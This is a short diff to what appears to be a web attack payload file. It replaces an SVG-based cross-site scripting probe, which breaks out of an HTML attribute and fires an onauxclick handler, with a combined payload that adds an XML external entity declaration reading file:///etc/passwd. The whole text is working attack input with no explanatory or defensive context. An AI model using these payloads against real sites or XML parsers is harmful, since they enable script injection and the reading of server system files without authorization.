@@ -1,1 +1,5 @@
-"><svg height="1000" width="1000" onauxclick=confirm`12233`> <circle cx="500" cy="500" r="400" stroke="black" stroke-width="3" fill="red" /> </svg>
+<svg><?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"><svg height="1000" width="1000" onauxclick=confirm`12233`> <circle cx="500" cy="500" r="400" stroke="black" stroke-width="3" fill="red" /> </svg>
+</svg>
